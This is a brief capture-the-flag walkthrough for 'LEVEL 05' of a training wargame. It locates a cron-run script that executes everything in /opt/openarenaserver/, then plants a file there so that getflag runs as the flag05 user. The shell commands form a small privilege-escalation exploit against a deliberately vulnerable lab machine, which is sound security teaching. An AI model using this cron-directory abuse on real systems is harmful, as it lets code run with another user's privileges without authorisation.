## LEVEL 05

In the first place, we search for files to use.  
-> `ls -la` or `la`  
As we can see, there are nothing we can use in the directory. So, we go to the root of the machine.  
-> `cd /`  
And search for files owns by user *flag05* and that are named *level05*.  
-> `find -user flag05 2> /dev/null`  
-> `find -name level05 2> /dev/null`

So, we have 2 files:  
* /usr/sbin/openarenaserver
* /var/mail/level05  

If we open */usr/sbin/openarenaserver*, we can see that we have a Shell script that execute all the files in */opt/openarenaserver/* and then removes them. Then, if we open *var/mail/level05*, we can notice that it is a script that executes */usr/sbin/openarenaserver* every 2 minutes using *cron*.  
To exploit this, we create a file in */opt/openarenaserver/* that prints `getflag` in a file in */tmp*.  
-> `cd /opt/openarenaserver`  
-> `echo "getflag > /tmp/flag" > exploit`  
Finally, we collect our flag and move on to the next level.  
-> `cat /tmp/flag`  
-> `su level06`